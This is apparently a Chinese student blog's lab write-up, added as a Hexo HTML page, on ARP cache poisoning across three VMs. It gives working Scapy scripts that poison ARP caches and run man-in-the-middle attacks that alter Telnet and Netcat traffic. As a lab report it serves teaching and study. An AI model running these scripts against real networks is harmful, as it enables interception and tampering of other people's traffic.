@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>ARP-Cache-Poisoning-Attack - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2020-10-18 10:37">
+      2020年10月18日 上午
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      49
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <article class="markdown-body">
+              <h1 id="ARP-Cache-Poisoning-Attack"><a href="#ARP-Cache-Poisoning-Attack" class="headerlink" title="ARP Cache Poisoning Attack"></a>ARP Cache Poisoning Attack</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>ARP（地址解析协议）协议是工作在网络层当中，它的作用是将IP地址转化成对应的MAC物理地址，从而进行链路层的链接以及通信，而ARP是不安全的，我们可以通过伪造对应的ARP包来实现ARP攻击，例如中间人攻击（Man-In-The-Middle），<a href="https://blog.51cto.com/13570193/2083332" target="_blank" rel="noopener">参考blog</a></p>
+<h2 id="Task-1-ARP-Cache-Poisoning"><a href="#Task-1-ARP-Cache-Poisoning" class="headerlink" title="Task 1: ARP Cache Poisoning"></a>Task 1: ARP Cache Poisoning</h2><p>首先是ARP包的构造，通过使用scapy可以进行实现</p>
+<pre><code class="hljs d"><span class="hljs-meta">#!/usr/bin/python3</span>
+from scapy.all <span class="hljs-keyword">import</span> *
+
+E = Ether()
+A = ARP()
+pkt = E/A
+sendp(pkt)</code></pre>
+
+<p>之后运行截图如下，并且通过ls（ARP）的命令可以来查看ARP各个字段的属性</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task1-1.PNG" srcset="/img/loading.gif" alt="task1-1"></p>
+<p>下面分别是三种方式来实现攻击（三台VM分别为A,B,M，我们需要实现的是对A的cache来进行攻击，使得在A的缓存中B的IP地址对应的是M的MAC地址）</p>
+<p>先记录下VM A,B,M的MAC地址以及对应的IP地址</p>
+<p>M：</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskA-1.PNG" srcset="/img/loading.gif" alt="taskA-1"></p>
+<p>A：</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskA-2.PNG" srcset="/img/loading.gif" alt="taskA-2"></p>
+<p>B：</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskA-3.PNG" srcset="/img/loading.gif" alt="taskA-3"></p>
+<p>然后分别记录下每个VM的初始化ARP缓存</p>
+<p>M：</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskA-4.PNG" srcset="/img/loading.gif" alt="taskA-4"></p>
+<p>A：</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskA-5.PNG" srcset="/img/loading.gif" alt="taskA-5"></p>
+<p>B：</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskA-6.PNG" srcset="/img/loading.gif" alt="taskA-6"></p>
+<h3 id="Task-1A-using-ARP-request"><a href="#Task-1A-using-ARP-request" class="headerlink" title="Task 1A (using ARP request)"></a>Task 1A (using ARP request)</h3><p>方法是在主机M上进行构造ARP request报文，发送给主机A</p>
+<p>具体如何实现的：在ARPrequest和response当中，当知道目的主机IP但是不知道对应的MAC地址的时候，我们可以将对应的目的地址设置为ff-ff-ff-ff-ff-ff-ff，此时会进行全站的广播，而当主机A收到广播对应的request报文的时候，他会先将request报文中的源IP地址和源MAC地址缓存在A的ARP cache当中</p>
+<p>下面是相关代码</p>
+<pre><code class="hljs nix"><span class="hljs-comment">#!/usr/bin/python3</span>
+from scapy.all <span class="hljs-built_in">import</span> *
+
+<span class="hljs-attr">VM_B_IP</span> = <span class="hljs-string">"10.0.2.6"</span>
+
+<span class="hljs-attr">dst_IP</span> = <span class="hljs-string">"10.0.2.5"</span>
+
+<span class="hljs-attr">MAC</span> = <span class="hljs-string">"08:00:27:e6:ae:83"</span>
+
+print(<span class="hljs-string">"Start the cache poison attack, check weather it succeed"</span>)
+
+<span class="hljs-attr">E</span> = Ether()
+
+E.<span class="hljs-attr">src</span> = MAC
+
+<span class="hljs-attr">A</span> = ARP()
+
+A.<span class="hljs-attr">op</span> = <span class="hljs-number">1</span>
+A.<span class="hljs-attr">hwsrc</span> = MAC
+A.<span class="hljs-attr">psrc</span> = VM_B_IP
+A.<span class="hljs-attr">pdst</span> = dst_IP
+
+<span class="hljs-attr">pkt</span> = E/A
+sendp(pkt)</code></pre>
+
+<p>这是在VM M上的运行截图</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskA-8.PNG" srcset="/img/loading.gif" alt="taskA-8"></p>
+<p>在VM A上，也就是我们的所要欺骗的ARP cache的主机</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskA-9.PNG" srcset="/img/loading.gif" alt="taskA-9"></p>
+<p>wireshark发现的确抓到了包，此时查看此时的ARP的cache情况</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskA-7.PNG" srcset="/img/loading.gif" alt="taskA-7"></p>
+<p>发现会多了B的IP地址映射到M的MAC地址上的信息</p>
+<p>这种方法是可行的，但是同时也会在A上面添加M的IP地址以及M的MAC地址相对应的条目，我认为这是由于在最开始的过程中，我的VM M并没有主机A的对应条目所导致的</p>
+<h3 id="Task-1B-using-ARP-reply"><a href="#Task-1B-using-ARP-reply" class="headerlink" title="Task 1B (using ARP reply)"></a>Task 1B (using ARP reply)</h3><p>方法是在VM M上构造一个ARP reply报文，并且把这个报文发送给主机A</p>
+<p>具体实现方法，当一个主机收到一个ARP reply报文的时候，它会直接把保温里面对应的源IP地址以及源MAC地址存储起来</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskB-1.PNG" srcset="/img/loading.gif" alt="taskB-1"></p>
+<p>首先需要将存储在VM A上面的原来欺骗成功的那一项删除，之后再进行欺骗</p>
+<p>相关代码</p>
+<pre><code class="hljs nix"><span class="hljs-comment">#!/usr/bin/python3</span>
+from scapy.all <span class="hljs-built_in">import</span> *
+
+<span class="hljs-attr">VM_A_MAC</span> = <span class="hljs-string">"08:00:27:69:66:dc"</span>
+
+<span class="hljs-attr">VM_A_IP</span> = <span class="hljs-string">"10.0.2.5"</span>
+
+<span class="hljs-attr">VM_B_IP</span> = <span class="hljs-string">"10.0.2.6"</span>
+
+<span class="hljs-attr">M_MAC</span> = <span class="hljs-string">"08:00:27:e6:ae:83"</span>
+
+print(<span class="hljs-string">"Start cache attack by using ARP reply, check the cache"</span>)
+<span class="hljs-attr">E</span> = Ether()
+
+E.<span class="hljs-attr">src</span> = M_MAC
+E.<span class="hljs-attr">dst</span> = VM_A_MAC
+
+<span class="hljs-attr">A</span> = ARP()
+
+A.<span class="hljs-attr">op</span> = <span class="hljs-number">2</span>
+A.<span class="hljs-attr">hwsrc</span> = M_MAC
+A.<span class="hljs-attr">psrc</span> = VM_B_IP
+A.<span class="hljs-attr">hwdst</span> = VM_A_MAC
+A.<span class="hljs-attr">pdst</span> = VM_A_IP
+
+<span class="hljs-attr">pkt</span> = E/A
+sendp(pkt)</code></pre>
+
+<p>在M上的运行截图</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskB-2.PNG" srcset="/img/loading.gif" alt="taskB-2"></p>
+<p>之后用wireshark在A上面抓包，能看到会显示出对应的reply包</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskB-3.PNG" srcset="/img/loading.gif" alt="taskB-3">)<img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskB-4.PNG" srcset="/img/loading.gif" alt="taskB-4"></p>
+<p>可以看到原本是没有这个记录/不完整的，之后在接收到reply包之后，B的IP对应M的MAC那一项在缓存中出现</p>
+<p>这个方法也是可行的、</p>
+<h3 id="Task-1C-using-ARP-gratuitous-message"><a href="#Task-1C-using-ARP-gratuitous-message" class="headerlink" title="Task 1C (using ARP gratuitous message)"></a>Task 1C (using ARP gratuitous message)</h3><p>ARP免费报文的格式（op为1）</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskC-1.png" srcset="/img/loading.gif" alt="taskC-1"></p>
+<blockquote>
+<p>由于该报文的特殊性，它可以用来完成以下各项工作：<br>第1种：检查网络中IP地址是否冲突。<br>主机A发送免费ARP报文，假设其它主机收到来自主机A的免费ARP报文后发现自己的IP地址和报文中的IP地址冲突，则会产生相应的ARP应答给主机A，主机A得知本机的IP地址与其它主机的IP地址与冲突。<br>第2种：更新网络中主机的ARP缓存表。<br>当主机A改变了MAC地址，它通过发送免费ARP报文通知网络中的其它主机更新ARP缓存表中主机A对应的映射记录。</p>
+</blockquote>
+<p>通过免费报文的发送，我们可以来进行修改cache的内容</p>
+<blockquote>
+<p>网络中的设备根据收到的免费ARP报文中携带的信息对自身的ARP缓存表进行更新修改。<br>收到免费ARP报文后，设备会先判断ARP缓存表中是否存在与此免费ARP报文源IP地址对应的ARP缓存表映射记录：<br>存在：根据免费ARP报文中携带的信息更新对应的ARP缓存表映射记录；<br>不存在：根据免费ARP报文中携带的信息新建ARP缓存表映射记录。<br>若关闭免费ARP报文学习功能，设备不会新建原先不存在的ARP缓存表映射记录，但会更新已存在的对应ARP缓存表映射记录</p>
+</blockquote>
+<p>在这里的具体实现方式：我们在主机M上面构造一个对应的免费报文，其中所有的本机IP我们都进行修改，改为B的IP，但是src的MAC地址还依旧是M的MAC地址，这样当主机A收到相应的报文的时候，就会根据报文内容来修改对应的cache</p>
+<p>具体代码如下</p>
+<pre><code class="hljs reasonml">#!/usr/bin/python3
+from scapy.all import *
+
+VM_B_IP = <span class="hljs-string">"10.0.2.6"</span>
+
+M_MAC = <span class="hljs-string">"08:00:27:e6:ae:83"</span>
+
+broadcast = <span class="hljs-string">"ff:ff:ff:ff:ff:ff"</span>
+
+print(<span class="hljs-string">"Use the gratuitous message to attack the cache"</span>)
+
+E = <span class="hljs-constructor">Ether()</span>
+
+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">E</span>.</span></span>dst = broadcast
+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">E</span>.</span></span>src = M_MAC
+
+A = <span class="hljs-constructor">ARP()</span>
+
+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">A</span>.</span></span>op = <span class="hljs-number">1</span>
+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">A</span>.</span></span>hwsrc = M_MAC
+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">A</span>.</span></span>psrc = VM_B_IP
+
+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">A</span>.</span></span>hwdst = broadcast
+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">A</span>.</span></span>pdst = VM_B_IP
+
+pkt = E/A
+sendp(pkt)</code></pre>
+
+<p>首先来看M上的运行</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskC-4.PNG" srcset="/img/loading.gif" alt="taskC-4"></p>
+<p>之后看VM A上面wireshark的抓包情况</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskC-2.PNG" srcset="/img/loading.gif" alt="taskC-2"></p>
+<p>发现会抓到包，并且更新cache</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskC-3.PNG" srcset="/img/loading.gif" alt="taskC-3"></p>
+<p>B的IP地址（10. 0. 2. 6）会对应到VM M的MAC地址上（08:00:27:e6:ae:83）</p>
+<h2 id="Task-2-MITM-Attack-on-Telnet-using-ARP-Cache-Poisoning"><a href="#Task-2-MITM-Attack-on-Telnet-using-ARP-Cache-Poisoning" class="headerlink" title="Task 2: MITM Attack on Telnet using ARP Cache Poisoning"></a>Task 2: MITM Attack on Telnet using ARP Cache Poisoning</h2><h3 id="Step-1-Launch-the-ARP-cache-poisoning-attack"><a href="#Step-1-Launch-the-ARP-cache-poisoning-attack" class="headerlink" title="Step 1 (Launch the ARP cache poisoning attack)"></a>Step 1 (Launch the ARP cache poisoning attack)</h3><p>在这里，采用了ARP request的方式来attack A和B里面的cache</p>
+<p>代码如下</p>
+<pre><code class="hljs nix"><span class="hljs-comment">#!/usr/bin/python3</span>
+from scapy.all <span class="hljs-built_in">import</span> *
+
+<span class="hljs-comment">#VM_B_IP = "10.0.2.6"</span>
+<span class="hljs-attr">VM_A_IP</span> = <span class="hljs-string">"10.0.2.5"</span>
+<span class="hljs-comment">#dst_IP = "10.0.2.5"</span>
+<span class="hljs-attr">dst_IP</span> = <span class="hljs-string">"10.0.2.6"</span>
+
+<span class="hljs-attr">MAC</span> = <span class="hljs-string">"08:00:27:e6:ae:83"</span>
+
+print(<span class="hljs-string">"Start the cache poison attack, check weather it succeed"</span>)
+
+<span class="hljs-attr">E</span> = Ether()
+
+E.<span class="hljs-attr">src</span> = MAC
+
+<span class="hljs-attr">A</span> = ARP()
+
+A.<span class="hljs-attr">op</span> = <span class="hljs-number">1</span>
+A.<span class="hljs-attr">hwsrc</span> = MAC
+A.<span class="hljs-attr">psrc</span> = VM_A_IP
+A.<span class="hljs-attr">pdst</span> = dst_IP
+
+<span class="hljs-attr">pkt</span> = E/A
+sendp(pkt)</code></pre>
+
+<p>之后A和B的cache缓存表发生变化，结果如下</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-1.PNG" srcset="/img/loading.gif" alt="task2-1">)<img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-2.PNG" srcset="/img/loading.gif" alt="task2-2"></p>
+<p>都将IP对应的MAC地址映射到了M的MAC地址上</p>
+<h3 id="Step-2-Testing"><a href="#Step-2-Testing" class="headerlink" title="Step 2 (Testing)"></a>Step 2 (Testing)</h3><p>由于在A上ping B和在B上面ping A得到的结果一样，所以下面截图和说明就以Aping B为例子来说明</p>
+<p>在A的terminal上面输入ping命令，发现刚开始会一直卡在第一行，之后会出现后面的东西</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-3.PNG" srcset="/img/loading.gif" alt="task2-3"></p>
+<p>同时，在wireshark关闭混杂模式的情况下进行抓包</p>
+<p>在A中</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-4.PNG" srcset="/img/loading.gif" alt="task2-4"></p>
+<p>会发现所有的request都是没有收到回答，no response found，大致原因如下</p>
+<blockquote>
+<p>1.在同一网段内</p>
+<p> 在主机 A 上运行“Ping 192.168.0.5”后，都发生了些什么呢? 首先，Ping 命令会构建一个 固定格式的 ICMP 请求数据包， 然后由 ICMP 协议将这个数据包连同地址“192.168.0.5”一起 交给IP 层协议（和 ICMP 一样，实际上是一组后台运行的进程），IP 层协议将以地址 “192.168.0.5”作为目的地址，本机 IP 地址作为源地址，加上一些其他的控制信息，构建一 个 IP 数据包，并想办法得到 192.168.0.5 的MAC 地址（物理地址，这是数据链路层协议构 建数据链路层的传输单元——帧所必需的），以便交给数据链路层构建一个数据帧。关键就 在这里，IP 层协议通过机器 B 的 IP 地址和自己的子网掩码，发现它跟自己属同一网络，就 直接在本网络内查找这台机器的 MAC,如果以前两机有过通信，在 A 机的 ARP 缓存表应该 有 B 机 IP 与其 MAC 的映射关系，如果没有，就发一个 ARP 请求广播，得到 B 机的 MAC, 一并交给数据链路层。后者构建一个数据帧，目的地址是 IP 层传过来的物理地址，源地址 则是本机的物理地址，还要附加上一些控制信息，依据以太网的介质访问规则，将它们传送 出去。 主机 B 收到这个数据帧后，先检查它的目的地址，并和本机的物理地址对比，如符合， 则接收；否则丢弃。接收后检查该数据帧，将 IP 数据包从帧中提取出来，交给本机的 IP 层 协议。同样，IP 层检查后，将有用的信息提取后交给 ICMP 协议，后者处理后，马上构建 一个 ICMP 应答包，发送给主机 A，其过程和主机 A 发送 ICMP 请求包到主机 B 一模一样。</p>
+<p>2.不在同一网段内</p>
+<p>在主机 A 上运行“Ping 192.168.1.4”后，开始跟上面一样，到了怎样得到 MAC 地址时，IP 协议通过计算发现 D 机与自己不在同一网段内，就直接将交由路由处理，也就是将路由的 MAC 取过来，至于怎样得到路由的 MAC，跟上面一样，先在 ARP 缓存表找，找不到就广 播吧。路由得到这个数据帧后，再跟主机 D 进行联系，如果找不到，就向主机 A 返回一个 超时的信息。</p>
+</blockquote>
+<p>所以在通过缓存表获得对应的M的MAC地址并且转发到M上，可以通过MAC地址的检查，但是IP的检查无法通过之后就会被丢弃</p>
+<p>于此同时，在结束ping之后我们输入arp -a来查看当前的缓存表内容，会发现B的IP原本对应的是M的MAC地址，但是现在又便回到了B的MAC地址</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-5.PNG" srcset="/img/loading.gif" alt="task2-5"></p>
+<p>这说明在ping的时候，并不是一直都在被丢弃，很有可能进行来重新的ARP广播并且收到了真正的地址</p>
+<p>同时，在B的cache中，A的IP地址对应的也有M的MAC地址转化为了A的MAC地址</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-6.PNG" srcset="/img/loading.gif" alt="task2-6"></p>
+<h3 id="Step-3-Turn-on-IP-forwarding"><a href="#Step-3-Turn-on-IP-forwarding" class="headerlink" title="Step 3 (Turn on IP forwarding)"></a>Step 3 (Turn on IP forwarding)</h3><p>打开M上的IP转发，同时用wireshark进行抓包</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-7.PNG" srcset="/img/loading.gif" alt="task2-7"></p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-9.PNG" srcset="/img/loading.gif" alt="task2-9"></p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-8.PNG" srcset="/img/loading.gif" alt="task2-8"></p>
+<p>可以看到在每个request之后都会有一个重定向的过程，并且在B上面运行wireshark，也会发现能够收到包，并且在之后查看cache，会发现IP地址对应假的MAC会被修改为正确的MAC地址</p>
+<h3 id="Step-4-Launch-the-MITM-attack"><a href="#Step-4-Launch-the-MITM-attack" class="headerlink" title="Step 4 (Launch the MITM attack)"></a>Step 4 (Launch the MITM attack)</h3><p>打开packet forward–建立telnet链接–关闭IP转发</p>
+<p>结果如下，首先是打开packet forward功能并且建立从A到B的链接</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-10.PNG" srcset="/img/loading.gif" alt="task2-10"></p>
+<p>之后在三台VM上面分别打开wireshark并且关闭混杂模式来抓取TCP的包</p>
+<p>之后在VM A上面输入ls命令，查看A的wireshark的包会发现</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-11.PNG" srcset="/img/loading.gif" alt="task2-11"></p>
+<p>而作为中间人的M并没有捕获到任何TCP的包</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-12.PNG" srcset="/img/loading.gif" alt="task2-12"></p>
+<p>而同时在B上面wireshark可以抓到对应的包</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-13.PNG" srcset="/img/loading.gif" alt="task2-13"></p>
+<p>同时，查看A和B此时的缓存表情况，会发现之前的MAC又被修改了回来</p>
+<p>关于Telnet回显的一些点</p>
+<blockquote>
+<p>Behavior of Telnet. In Telnet, typically, every character we type in the Telnet window triggers an individual TCP packet, but if you type very fast, some characters may be sent together in the same packet. That is why in a typical Telnet packet from client to server, the payload only contains one character. The character sent to the server will be echoed back by the server, and the client will then display the character in its window. Therefore, what we see in the client window is not the direct result of the typing; whatever we type in the client window takes a round trip before it is displayed. If the network is disconnected, whatever we typed on the client window will not displayed, until the network is recovered. Similarly, if attackers change the character to Z during the round trip, Z will be displayed at the Telnet client window, even though that is not what you have typed.</p>
+</blockquote>
+<p>在这里，记得要把forward关掉</p>
+<p>具体代码如下（其中为了说明原来的真正输入，我把olddata进行了打印）</p>
+<pre><code class="hljs clean">#!/usr/bin/python3
+<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *
+VM_A_IP = <span class="hljs-string">"10.0.2.5"</span>
+VM_B_IP = <span class="hljs-string">"10.0.2.6"</span>
+def spoof_pkt(pkt):
+	<span class="hljs-keyword">if</span> pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
+
+# Create a new packet based on the captured one.
+# (<span class="hljs-number">1</span>) We need to delete the checksum fields <span class="hljs-keyword">in</span> the IP and TCP headers,
+# because our modification will make them invalid.
+# Scapy will recalculate them for us <span class="hljs-keyword">if</span> these fields are missing.
+# (<span class="hljs-number">2</span>) We also delete the original TCP payload.
+
+		
+
+		newpkt = IP(pkt[IP])
+		del(newpkt.chksum)
+		del(newpkt[TCP].chksum)
+		del(newpkt[TCP].payload)
+
+
+#####################################################################
+# Construct the new payload based on the old payload.
+# Students need to implement this part.
+		olddata = pkt[TCP].payload.load # Get the original payload data
+		newdata = <span class="hljs-string">'Z'</span> # No change is made <span class="hljs-keyword">in</span> this sample <span class="hljs-keyword">code</span>
+		print(<span class="hljs-string">"Message:"</span>,olddata)
+#####################################################################
+# Attach the new data and set the packet out
+
+
+
+		send(newpkt/newdata)
+	elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
+		send(pkt[IP]) # Forward the original packet
+pkt = sniff(filter=<span class="hljs-string">'tcp and not ether src 08:00:27:e6:ae:83'</span>,prn=spoof_pkt)</code></pre>
+
+<p>之后在M上面运行嗅探和欺骗程序，在A上面telnet B，当在A上面输入字符的时候，由于每个字符都是先通过TCP发送给server端，之后回显才会在client端进行显示，所以在这里，A上面应该显示的是ZZ，结果如下</p>
+<p>在A上面输入ls</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-14.PNG" srcset="/img/loading.gif" alt="task2-14"></p>
+<p>而同时，在M上面打印sniff到的olddata</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-15.PNG" srcset="/img/loading.gif" alt="task2-15"></p>
+<h2 id="Task-3-MITM-Attack-on-Netcat-using-ARP-Cache-Poisoning"><a href="#Task-3-MITM-Attack-on-Netcat-using-ARP-Cache-Poisoning" class="headerlink" title="Task 3: MITM Attack on Netcat using ARP Cache Poisoning"></a>Task 3: MITM Attack on Netcat using ARP Cache Poisoning</h2><p>关于netcat的一些点</p>
+<blockquote>
+<p>Once the connection is made, you can type messages on A. Each line of messages will be put into a TCP packet sent to B, which simply displays the message. </p>
+</blockquote>
+<p>具体实现的代码</p>
+<pre><code class="hljs clean">#!/usr/bin/python3
+<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *
+VM_A_IP = <span class="hljs-string">"10.0.2.5"</span>
+VM_B_IP = <span class="hljs-string">"10.0.2.6"</span>
+def spoof_pkt(pkt):
+	<span class="hljs-keyword">if</span> pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
+
+# Create a new packet based on the captured one.
+# (<span class="hljs-number">1</span>) We need to delete the checksum fields <span class="hljs-keyword">in</span> the IP and TCP headers,
+# because our modification will make them invalid.
+# Scapy will recalculate them for us <span class="hljs-keyword">if</span> these fields are missing.
+# (<span class="hljs-number">2</span>) We also delete the original TCP payload.
+
+		olddata = pkt[TCP].payload.load # Get the original payload data
+		print(<span class="hljs-string">"ARP Cache Poisoning Man-in-the-MiddleAttacking..."</span>)
+		print(<span class="hljs-string">"Original Packet........."</span>)
+		print(<span class="hljs-string">"Source IP: "</span>, pkt[IP].src)
+		print(<span class="hljs-string">"Destination IP: "</span>, pkt[IP].dst)
+		print(<span class="hljs-string">"Message: "</span>, olddata)
+		print(<span class="hljs-string">"Message Length: %d"</span> % (len(olddata)))
+
+
+		newpkt = IP(pkt[IP])
+		del(newpkt.chksum)
+		del(newpkt[TCP].chksum)
+		del(newpkt[TCP].payload)
+
+
+#####################################################################
+# Construct the new payload based on the old payload.
+# Students need to implement this part.
+		
+		newdata = olddata.replace(b<span class="hljs-string">'haolong'</span>, b<span class="hljs-string">'AAAAAAA'</span>) 
+		newpkt = newpkt/newdata
+
+
+		print(<span class="hljs-string">"Spoofed Packet........."</span>)
+		print(<span class="hljs-string">"Source IP : "</span>, newpkt[IP].src)
+		print(<span class="hljs-string">"Destination IP :"</span>, newpkt[IP].dst)
+		print(<span class="hljs-string">"Message: "</span>, newdata)
+		print(<span class="hljs-string">"Message Length: %d"</span> % (len(newdata)))
+
+		
+#####################################################################
+# Attach the new data and set the packet out
+
+
+
+		send(newpkt)
+	elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
+		print(<span class="hljs-string">"The message is sent from host B to host A..."</span>)
+		send(pkt[IP]) # Forward the original packet
+pkt = sniff(filter=<span class="hljs-string">'tcp and not ether src 08:00:27:e6:ae:83'</span>,prn=spoof_pkt)</code></pre>
+
+<p>在这里面，为了能够更加清晰的在M端看到修改的东西，加了一些print进去</p>
+<p>运行结果，首先是建立好nc连接后，在A上面输入</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/tsk3-1.PNG" srcset="/img/loading.gif" alt="tsk3-1"></p>
+<p>之后在M上面运行sniff_spoof程序，可以看到修改前和修改后的对比</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task3-2.PNG" srcset="/img/loading.gif" alt="task3-2"></p>
+<p>此时，可以看到长度以及不需要修改的字符串并没有发生改变，在B上面的显示</p>
+<p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task3.PNG" srcset="/img/loading.gif" alt="task3"></p>
